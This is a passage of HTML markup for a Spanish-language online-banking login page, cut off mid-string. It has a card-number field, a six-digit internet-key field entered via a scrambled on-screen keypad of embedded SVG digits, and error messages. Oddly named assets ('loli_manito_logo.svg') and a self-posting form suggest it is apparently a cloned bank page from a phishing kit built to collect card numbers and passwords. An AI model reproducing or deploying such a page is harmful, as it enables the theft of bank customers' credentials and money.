            <img onclick="evalRanTableDNI('4'); logintud_dni();" class="seed-enabledx" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE4LjksMjAuNmgtMy43Yy0xLDAtMS4yLTAuNC0xLjItMC45YzAtMC4zLDAuMS0wLjcsMC43LTEuNWwzLjYtNC42YzAuNS0wLjcsMC45LTAuOSwxLjUtMC45ICAgYzAuNSwwLDAuOSwwLjMsMC45LDEuMXY1LjVIMjJ2MS4zaC0xLjNWMjNIMTl2LTIuNEgxOC45eiBNMTUuNywxOS4yaDMuMlYxNUwxNS43LDE5LjJ6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyOCIgY3k9IjI3Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMTgiIGN5PSIyMSIvPgo8L3N2Zz4=">
            <img onclick="evalRanTableDNI('8'); logintud_dni();" class="seed-enabledx" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE4LDEyLjZjMS43LDAsMy42LDAuNSwzLjYsMi41YzAsMS4xLTAuMiwxLjgtMS41LDIuNWMxLDAuNiwxLjYsMS4yLDEuNiwyLjVjMCwyLjQtMS43LDIuOS0zLjgsMi45ICAgYy0yLjIsMC0zLjgtMC43LTMuOC0yLjljMC0xLjMsMC42LTEuOSwxLjYtMi41Yy0xLTAuNi0xLjUtMS4yLTEuNS0yLjVDMTQuNCwxMy4xLDE2LjIsMTIuNiwxOCwxMi42eiBNMTgsMjEuNmMxLjEsMCwyLTAuMywyLTEuNiAgIGMwLTEuMS0wLjQtMS42LTIuNS0xLjhjLTEsMC4yLTEuNiwwLjctMS42LDEuOEMxNiwyMS40LDE2LjgsMjEuNiwxOCwyMS42eiBNMTguNCwxNi45YzEtMC4yLDEuNS0wLjYsMS41LTEuNmMwLTEuMi0wLjktMS40LTItMS40ICAgUzE2LDE0LjEsMTYsMTUuM0MxNi4xLDE2LjIsMTYuNCwxNi44LDE4LjQsMTYuOXoiLz4KPC9nPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjE5IiBjeT0iMTIiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNiIgY3k9IjI3Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMzEiIGN5PSI4Ii8+Cjwvc3ZnPg==">
            <img onclick="evalRanTableDNI('9'); logintud_dni();" class="seed-enabledx" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjEsMTZjMC0yLjcsMS41LTMuMywzLjktMy4zYzMsMCwzLjcsMS42LDMuNyw0LjJjMCw0LjctMSw2LjItNS42LDYuMmMtMC4xLDAtMC4zLDAtMS4xLDAgICBsLTAuMS0xLjRjMS44LTAuMSw1LDAuMyw1LTIuNmMtMC41LDAuMS0xLjMsMC4yLTIsMC4yQzE1LjUsMTkuMiwxNC4xLDE4LjUsMTQuMSwxNnogTTE4LDE0Yy0xLjcsMC0yLjIsMC41LTIuMiwxLjkgICBjMCwxLjUsMC44LDEuOCwyLjIsMS44YzAuNiwwLDEuMy0wLjEsMS44LTAuMmMwLTAuMywwLTAuNywwLTFDMTkuOSwxNS4zLDE5LjcsMTQsMTgsMTR6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSI5IiBjeT0iMTUiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIzMCIgY3k9IjI1Ii8+Cjwvc3ZnPg==">
            <img onclick="evalRanTableDNI('7'); logintud_dni();" class="seed-enabledx" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjYsMTQuMnYtMS41aDZjMC43LDAsMS4xLDAuMywxLjEsMC44YzAsMC4yLDAsMC40LTAuMSwwLjZsLTQsOC44aC0ybDQuMy04LjcgICBDMTkuOSwxNC4yLDE0LjYsMTQuMiwxNC42LDE0LjJ6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIxNSIgY3k9IjIyIi8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMTgiIGN5PSIxNSIvPgo8L3N2Zz4=">
            <img class="clean-buttonx" src="files/img/loli_manito_clean-new.svg" onclick="deletexd_dni(); logintud_dni();">
          </div>
        </div>
        <div>
          <div class="left">
            <img onclick="evalRanTableDNI('0'); logintud_dni();" class="seed-enabledx" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE4LDIzYy0zLjEsMC0zLjgtMS43LTMuOC01LjJzMC42LTUuMiwzLjgtNS4yczMuOCwxLjcsMy44LDUuMlMyMS4xLDIzLDE4LDIzeiBNMTgsMjEuNiAgIGMxLjksMCwyLTEuNSwyLTMuOFMxOS45LDE0LDE4LDE0cy0yLDEuNS0yLDMuOFMxNi4xLDIxLjYsMTgsMjEuNnoiLz4KPC9nPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjMwIiBjeT0iMiIvPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjI4IiBjeT0iMjYiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNiIgY3k9IjI4Ii8+Cjwvc3ZnPg==">
            <img onclick="evalRanTableDNI('2'); logintud_dni();" class="seed-enabledx" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjQsMjIuOWMwLjYtMy4xLDAuOC00LjMsMy4yLTUuM2MxLjQtMC42LDItMS4xLDItMi4yUzE5LDE0LDE3LDE0Yy0wLjcsMC0xLjYsMC4xLTIuMywwLjIgICBMMTQuNiwxM2MwLjktMC4yLDIuMS0wLjMsMy4zLTAuM2MyLDAsMy42LDAuNSwzLjYsMi41YzAsMS45LTEsMy0zLDMuOGMtMS42LDAuNi0xLjksMS4yLTIsMi41aDVWMjNMMTQuNCwyMi45TDE0LjQsMjIuOXoiLz4KPC9nPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjI0IiBjeT0iMzIiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIzMSIgY3k9IjE3Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMjgiIGN5PSIzMyIvPgo8L3N2Zz4=">
            <img onclick="evalRanTableDNI('3'); logintud_dni();" class="seed-enabledx" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTIxLjMsMTUuMmMwLDEuMS0wLjUsMS45LTEuNSwyLjRjMSwwLjQsMS42LDEsMS42LDIuM2MwLDIuNC0xLjUsMy4yLTMuOSwzLjIgICBjLTEuMiwwLTIuMi0wLjEtMy4xLTAuM2wwLjItMS40YzAuOCwwLjEsMS43LDAuMiwyLjUsMC4yYzEuNywwLDIuNC0wLjMsMi40LTEuNmMwLTAuOS0wLjQtMS40LTEuMi0xLjVjLTAuNi0wLjEtMS4zLTAuMS0yLjEtMC4xICAgSDE2VjE3YzAuOCwwLDEuNi0wLjEsMi4zLTAuMmMwLjgtMC4xLDEuMS0wLjYsMS4xLTEuNGMwLTEuMi0wLjktMS4zLTIuMS0xLjNjLTAuOSwwLTEuOCwwLjEtMi43LDAuMkwxNC40LDEzICAgYzAuOS0wLjIsMS45LTAuMywzLTAuM0MxOS41LDEyLjYsMjEuMywxMywyMS4zLDE1LjJ6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNCIgY3k9IjQiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNSIgY3k9IjE2Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iNyIgY3k9IjYiLz4KPC9zdmc+">
            <img onclick="evalRanTableDNI('5'); logintud_dni();" class="seed-enabledx" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjcsMjEuM2MwLjgsMC4xLDEuNywwLjIsMi41LDAuMmMxLjgsMCwyLjQtMC4yLDIuNC0yYzAtMS40LTEuNS0xLjYtMi44LTEuNmMtMC43LDAtMS4zLDAtMiwwICAgbDAuNC01LjNoNi4xdjEuNWgtNC42bC0wLjIsMi40YzAuMiwwLDAuNSwwLDAuNywwYzIuNSwwLDQuMywwLjQsNC4zLDMuMWMwLDIuNC0xLjMsMy4zLTMuOCwzLjNjLTEuMSwwLTIuMi0wLjEtMy4yLTAuM0wxNC43LDIxLjN6ICAgIi8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNiIgY3k9IjkiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIzMiIgY3k9IjgiLz4KPC9zdmc+">
            <img onclick="evalRanTableDNI('6'); logintud_dni();" class="seed-enabledx" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTIxLjksMTkuN2MwLDIuNy0xLjUsMy4zLTMuOSwzLjNjLTMsMC0zLjctMS42LTMuNy00LjJjMC00LjcsMS02LjIsNS42LTYuMmMwLjEsMCwwLjMsMCwxLjEsMCAgIGwwLjEsMS40Yy0xLjgsMC4xLTUtMC4zLTUsMi42YzAuNS0wLjEsMS4zLTAuMiwyLTAuMkMyMC41LDE2LjUsMjEuOSwxNy4xLDIxLjksMTkuN3ogTTE3LjksMjEuNmMxLjcsMCwyLjItMC41LDIuMi0xLjkgICBjMC0xLjUtMC44LTEuOC0yLjItMS44Yy0wLjYsMC0xLjMsMC4xLTEuOCwwLjJjMCwwLjMsMCwwLjcsMCwxQzE2LjEsMjAuMywxNi4zLDIxLjYsMTcuOSwyMS42eiIvPgo8L2c+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iOSIgY3k9IjEzIi8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMSIgY3k9IjIxIi8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMjMiIGN5PSIyMyIvPgo8L3N2Zz4=">
            <img class="clean-buttonx" src="files/img/loli_manito_delete-new.svg" onclick="clearxd_dni(); logintud_dni();">
          </div>
        </div>
      </div>
      			<div>
					<div class="boton-box" style=" ">
        				<button style="outline: none !important;" id="boton" class="boton disabled">Continuar<i style="font-size: 15px; margin-left: 5px;" class="fas fa-arrow-right"></i></button>
        			</div>
				</div>
      </center>
			</div>
			</form>
		</div>

		</div>
	</div>

	<header class="login-header">
		<div style="display: inline-flex; align-items: center;">
			<img style="width: 100px;" src="files/img/loli_manito_logo.svg">
		</div>
	</header>
	<div style="display: flex;">
	<aside class="prueba"></aside>
	<div class="box-login">

		<form onsubmit="return validar()" method="post">

		<div id="falta" class="hidden">
			<div class="error">
				<i class="fas fa-exclamation-triangle triangulo"></i>
				<div style="padding-left: 10px; pointer-events: none;">
					<span style="font-family: Flexo-Bold;">Los datos ingresados son incorrectos.</span>
					<span style="font-family: Flexo-Regular;">Por favor vuelva a intentarlo</span>
				</div>
				<i onclick="close_error_falta();" class="far fa-times-circle cruz"></i>
			</div>
		</div>

		<div id="no-exist" class="hidden">
			<div class="error">
				<i class="fas fa-exclamation-triangle triangulo"></i>
				<div style="padding-left: 10px; pointer-events: none;">
					<span style="font-family: Flexo-Regular;">El número de tarjeta o la clave que has ingresado no existe. Por favor, vuelve a intentarlo.</span>
				</div>
				<i onclick="close_error_falta();" style="" class="far fa-times-circle cruz"></i>
			</div>
		</div>

		<div class="title-form">Banca por Internet</div>
		<div class="subtitle-card" id="subtitle-card">Número de tarjeta</div>
		<div style="margin-top: 30px;">
			<label class="label" id="labelcaca">
				<input class="input-form" type="tel" id="card" name="card" onkeypress="isInputNumber(event)" onkeydown="clear_error_card();" maxlength="16">
				<input type="hidden" name="validacion" id="validacion"/>
				<i id="card-icon" class="card-icon"></i>
			</label>
		</div>
		<div style="display: flex; margin-top: 30px; margin-bottom: 30px;">
			<span style="height: 12px; width: 12px; border: 0.125rem solid #888888; border-radius: 15%; background: #e8e8e8; margin-right: 7px;"></span>
			<span style="font-family: Flexo-Regular; font-size: 0.75rem; display: inline-flex; align-items: center;">Recordar tarjeta</span>
		</div>

		<div style="display: flex; margin-top: 48px;">
			<div class="subtitle-clave" id="subtitle-clave">Clave de Internet de 6 dígitos</div>
			<img src="files/img/loli_manito_info.png" style="width: 15px; height: 15px; margin-left: 5px; display: inline-flex; align-items: center;">
		</div>

		<div style="margin-top: 30px;">

			<input type="hidden" id="ind_long_clave" name="ind_long_clave" value="6" />
			<input type="hidden" id="token" name="clave" value="">

			<label class="label" id="label-pass">
				<input class="input-form" type="text" name="" onclick="showkeyboard();" readonly="">
				<i id="pass-icon" class="lock-icon"></i>
					<div id="botonsitos" class="botonsitos hidden">
						<div id="1" class="botoneslenght"></div>
						<div id="2" class="botoneslenght"></div>
						<div id="3" class="botoneslenght"></div>
						<div id="4" class="botoneslenght"></div>
						<div id="5" class="botoneslenght"></div>
						<div id="6" class="botoneslenght"></div>
					</div>
			</label>
		</div>
      	<div id="keypad" class="keypad hidden">
               <div class="keypad-digit" onclick="evalRanTable('9'); logintud(); clear_error_card(); clear_error_clave();"><img alt="" class="image-digit" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdod